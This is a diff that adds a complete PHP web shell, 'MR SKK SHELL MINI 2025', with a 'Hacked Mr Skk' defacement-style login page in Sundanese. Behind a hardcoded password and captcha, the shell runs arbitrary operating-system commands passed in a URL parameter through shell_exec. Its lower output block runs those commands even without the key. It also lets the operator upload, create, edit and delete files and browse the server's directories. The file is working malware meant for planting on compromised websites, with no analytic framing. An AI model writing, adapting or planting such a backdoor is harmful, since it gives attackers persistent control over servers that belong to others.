@@ -1,0 +1,257 @@
+<?php
+$password = "9nagagenerasiterbaru";
+session_start();
+error_reporting(0);
+set_time_limit(0);
+ini_set("memory_limit", -1);
+$sessioncode = md5(__FILE__);
+
+// Generate random math captcha if not set
+if (!isset($_SESSION['captcha_question'])) {
+    $a = rand(1, 9);
+    $b = rand(1, 9);
+    $_SESSION['captcha_question'] = "$a x $b";
+    $_SESSION['captcha_answer'] = $a * $b;
+}
+
+if (!empty($password) && $_SESSION[$sessioncode] != $password) {
+    if (
+        isset($_POST['pass']) && $_POST['pass'] === $password &&
+        isset($_POST['captcha']) && intval($_POST['captcha']) === $_SESSION['captcha_answer']
+    ) {
+        $_SESSION[$sessioncode] = $password;
+        unset($_SESSION['captcha_question']);
+        unset($_SESSION['captcha_answer']);
+    } else {
+        // Refresh captcha if salah
+        $a = rand(1, 9);
+        $b = rand(1, 9);
+        $_SESSION['captcha_question'] = "$a x $b";
+        $_SESSION['captcha_answer'] = $a * $b;
+
+        print <<<HTML
+<!DOCTYPE html>
+<html lang="su">
+<head>
+    <meta charset="UTF-8">
+    <title>HACKED MR SKK</title>
+    <style>
+        body {
+            font-family: monospace;
+            background: url('https://imgsrv2.voi.id/xRdbr65pI3oWPGWqgOB9IzaQ0sGlh4z_SUkw72rLuCQ/auto/1200/675/sm/1/bG9jYWw6Ly8vcHVibGlzaGVycy8zNzI0MTAvMjAyNDA0MDkxNDA2LW1haW4uY3JvcHBlZF8xNzEyNjQ2NDI4LmpwZWc.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            text-align: center;
+            padding-top: 10%;
+        }
+        h1 {
+            color: #DA70D6;
+            font-size: 32px;
+        }
+        p {
+            color: #DA70D6;
+            font-size: 18px;
+        }
+        input[type='password'], input[type='text'], input[type='submit'] {
+            padding: 10px;
+            margin: 10px;
+            border-radius: 5px;
+            border: none;
+            background-color: rgba(255,255,255,0.8);
+            color: #000;
+            font-weight: bold;
+        }
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 30px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+        label {
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Hacked Mr Skk</h1>
+        <p>Silahkan Masuk Bosku.</p>
+        <form method="post">
+            <input type="password" name="pass" placeholder="Ketik sandi..." required><br>
+            <label>Captcha: {$_SESSION['captcha_question']} = </label><br>
+            <input type="text" name="captcha" placeholder="Jawaban..." required><br>
+            <input type="submit" value="Kirim">
+        </form>
+    </div>
+</body>
+</html>
+HTML;
+        exit;
+    }
+}
+?>
+<?php
+$pass = "sandi-rahasia";
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
+$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
+$delete_target = isset($_GET['delete']) ? $_GET['delete'] : null;
+
+if (isset($_GET['key']) && $_GET['key'] === $pass) {
+    if (isset($_GET['cmd'])) {
+        echo "<pre class='cmd-output'>" . shell_exec($_GET['cmd']) . "</pre>";
+    }
+
+    if (isset($_FILES['upload_file'])) {
+        $file_tmp = $_FILES['upload_file']['tmp_name'];
+        $file_name = $_FILES['upload_file']['name'];
+        move_uploaded_file($file_tmp, $current_dir . '/' . $file_name);
+    }
+
+    if (isset($_POST['create_dir'])) {
+        $new_dir = $_POST['dir_name'];
+        mkdir($current_dir . '/' . $new_dir);
+    }
+
+    if (isset($_POST['create_file'])) {
+        $new_file = $_POST['file_name'];
+        file_put_contents($current_dir . '/' . $new_file, "");
+    }
+
+    if (isset($_POST['save_file'])) {
+        $file_content = $_POST['file_content'];
+        file_put_contents($current_dir . '/' . $edit_file, $file_content);
+    }
+
+    if ($delete_target) {
+        $target_path = $current_dir . '/' . $delete_target;
+        if (is_dir($target_path)) {
+            rmdir($target_path);
+        } else {
+            unlink($target_path);
+        }
+    }
+}
+
+function getFilePermissions($file) {
+    return substr(sprintf('%o', fileperms($file)), -4);
+}
+
+function getParentDirectory($dir) {
+    return dirname($dir);
+}
+
+function getFileContent($file) {
+    return file_get_contents($file);
+}
+?>
+<!DOCTYPE html>
+<html lang="su">
+<head>
+    <meta charset="UTF-8">
+    <title>MR SKK SHELL MINI 2025</title>
+    <style>
+        body { font-family: monospace; background-color: #1E1E1E; color: #FFFFFF; padding: 20px; text-align: center; }
+        h1 { color: #FF4500; }
+        .container { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin-top: 20px; }
+        .form-container { background-color: #2C2C2C; padding: 15px; border-radius: 5px; flex: 1 1 calc(30% - 15px); }
+        input[type="text"], input[type="file"], input[type="submit"], textarea {
+            width: calc(100% - 22px);
+            padding: 10px; margin: 10px 0;
+            border: 1px solid #4CAF50; border-radius: 5px;
+            background-color: #4CAF50; color: #FFFFFF;
+        }
+        pre { background-color: #2C2C2C; padding: 10px; border-radius: 5px; color: #FFFF00; overflow-x: auto; }
+        .current-dir { color: #FFD700; }
+        .logo { margin: 20px 0; }
+        ul { list-style-type: none; padding: 0; text-align: left; margin: 0 auto; max-width: 700px; }
+        li { margin: 5px 0; font-size: 15px; }
+        a { text-decoration: none; }
+        .action-links a { margin-left: 8px; color: orange; }
+    </style>
+</head>
+<body>
+<h1>MR SKK SHELL MINI 2025</h1>
+<div class="logo">
+    <img src="https://res.cloudinary.com/di1pwoapk/image/upload/v1737373092/skk1x1clear_oswurm.png" alt="Logo" style="max-width: 150px;">
+</div>
+<p>Dir ayeuna: <a class="current-dir" href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode($current_dir); ?>"><?php echo htmlspecialchars($current_dir); ?></a></p>
+
+<?php if (dirname($current_dir) !== '/') : ?>
+    <a href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode(getParentDirectory($current_dir)); ?>">⬅️ Ke Dir Blakang</a>
+<?php endif; ?>
+
+<h2>📁 Daftar File & Folder:</h2>
+<ul>
+    <?php
+    $files = scandir($current_dir);
+    foreach ($files as $file) {
+        if ($file !== '.' && $file !== '..') {
+            $filePath = $current_dir . '/' . $file;
+            $perm = getFilePermissions($filePath);
+
+            if (is_dir($filePath)) {
+                $color = is_writable($filePath) ? '#00FF00' : 'red';
+                echo "<li>📁 <a href='?key=$pass&dir=" . urlencode($filePath) . "' style='color: $color;'>$file</a>
+                    <span class='action-links'>[<a href='?key=$pass&dir=" . urlencode($current_dir) . "&delete=" . urlencode($file) . "'>🗑️</a>]</span>
+                    (Perm: $perm)</li>";
+            } else {
+                $color = is_readable($filePath) ? '#00FF00' : 'red';
+                echo "<li>📄 <a href='?key=$pass&dir=" . urlencode($current_dir) . "&edit=" . urlencode($file) . "' style='color: $color;'>$file</a>
+                    <span class='action-links'>[<a href='?key=$pass&dir=" . urlencode($current_dir) . "&delete=" . urlencode($file) . "'>🗑️</a>]</span>
+                    (Perm: $perm)</li>";
+            }
+        }
+    }
+    ?>
+</ul>
+
+<div class="container">
+    <div class="form-container">
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="upload_file" />
+            <input type="submit" value="Unggah File" />
+        </form>
+    </div>
+    <div class="form-container">
+        <form method="post">
+            <input type="text" name="dir_name" placeholder="Nami Dir Anyar" required />
+            <input type="submit" name="create_dir" value="Nyieun Dir Anyar" />
+        </form>
+    </div>
+    <div class="form-container">
+        <form method="post">
+            <input type="text" name="file_name" placeholder="Nami File Anyar" required />
+            <input type="submit" name="create_file" value="Nyieun File Anyar" />
+        </form>
+    </div>
+
+    <?php if ($edit_file): ?>
+        <div class="form-container" style="flex-basis: 100%;">
+            <h2>Edit File: <?php echo htmlspecialchars($edit_file); ?></h2>
+            <form method="post">
+                <textarea name="file_content" rows="10"><?php echo htmlspecialchars(getFileContent($current_dir . '/' . $edit_file)); ?></textarea>
+                <input type="submit" name="save_file" value="Simpen Parobahan" />
+            </form>
+        </div>
+    <?php endif; ?>
+</div>
+
+<form method="get" style="margin-top: 30px;">
+    <input type="hidden" name="key" value="<?php echo $pass; ?>">
+    <input type="text" name="cmd" placeholder="Paréntah (cth: ls)" />
+    <input type="submit" value="CMD SKK" />
+</form>
+
+<h2>🖥️ Hasil Paréntah:</h2>
+<pre>
+<?php
+if (isset($_GET['cmd'])) {
+    echo htmlspecialchars(shell_exec($_GET['cmd']));
+}
+?>
+</pre>
+<div style="margin-top: 20px;">
+    <a href="?key=<?php echo $pass; ?>&dir=<?php echo urlencode(getcwd()); ?>" style="padding: 10px; background-color: #4CAF50; color: #FFFFFF; text-decoration: none; border-radius: 5px;">🏠 Home Shell</a>
+</div>
+</body>
+</html>
